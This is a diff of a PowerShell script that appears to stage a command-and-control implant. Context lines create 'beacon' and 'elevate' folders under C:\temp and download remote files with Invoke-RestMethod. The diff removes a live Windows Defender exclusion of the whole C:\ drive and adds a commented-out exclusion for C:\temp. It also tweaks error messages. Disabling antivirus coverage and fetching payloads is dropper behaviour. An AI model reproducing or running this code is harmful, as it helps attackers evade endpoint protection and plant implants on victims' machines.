@@ -1,11 +1,3 @@
-# Excludes file paths
-try {
-    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
-} catch {
-    Write-Error "Failed to add exclusion path: $_"
-    exit 1
-}
-
 # Create the necessary directories
 $directories = @("C:\temp", "C:\temp\beacon", "C:\temp\beacon\elevate")
 foreach ($dir in $directories) {
@@ -13,11 +5,19 @@ foreach ($dir in $directories) {
         try {
             mkdir $dir -ErrorAction Stop | Out-Null
         } catch {
-            Write-Error "Failed to create directory $dir: $_"
+            Write-Error "Failed to create directory $dir = $_"
             exit 1
         }
     }
 }
+
+# # Excludes file paths
+# try {
+#     Add-MpPreference -ExclusionPath "C:\temp" -ErrorAction Stop
+# } catch {
+#     Write-Error "Failed to add exclusion path: $_"
+#     exit 1
+# }
 
 # Download the necessary files
 $files = @{
@@ -39,7 +39,7 @@ foreach ($url in $files.Keys) {
     try {
         Invoke-Restmethod -Uri $url -OutFile $files[$url] -ErrorAction Stop
     } catch {
-        Write-Error "Failed to download $url: $_"
+        Write-Error "Failed to download $url = $_"
         exit 1
     }
 }
